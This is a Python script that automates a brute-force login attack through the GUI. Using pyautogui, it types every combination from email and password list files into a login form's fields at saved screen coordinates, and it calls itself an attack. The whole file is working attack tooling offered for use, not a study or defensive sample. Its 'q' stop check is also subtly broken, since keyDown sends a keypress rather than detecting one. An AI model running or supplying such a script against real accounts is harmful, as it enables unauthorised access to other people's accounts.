import pyautogui
import time
import json
import sys

# Load credentials
with open("emails.txt", "r") as f:
    emails = [line.strip() for line in f.readlines()]

with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# Load coordinates
try:
    with open("coords.json", "r") as f:
        coords = json.load(f)
except FileNotFoundError:
    print("Error: Run detect_coordinates.py first!")
    sys.exit()

def login_attempt(email, password):
    # Email field
    pyautogui.click(coords["email"][0], coords["email"][1])
    pyautogui.hotkey("ctrl", "a")
    pyautogui.press("backspace")
    pyautogui.typewrite(email)
    
    # Password field
    pyautogui.click(coords["password"][0], coords["password"][1])
    pyautogui.hotkey("ctrl", "a")
    pyautogui.press("backspace")
    pyautogui.typewrite(password)
    
    # Login button
    pyautogui.click(coords["login"][0], coords["login"][1])
    time.sleep(2)  # Wait for login response

# Keyboard interrupt handler
def emergency_stop():
    print("\n[!] Brute-force stopped by user.")
    sys.exit()

print("Press Ctrl+C or 'q' at any time to stop the attack")

try:
    for email in emails:
        for password in passwords:
            # Check for manual stop (press 'q')
            if pyautogui.keyDown('q'):
                emergency_stop()
            
            print(f"Attempting {email}:{password}")
            login_attempt(email, password)
            time.sleep(0.5)

except KeyboardInterrupt:
    emergency_stop()
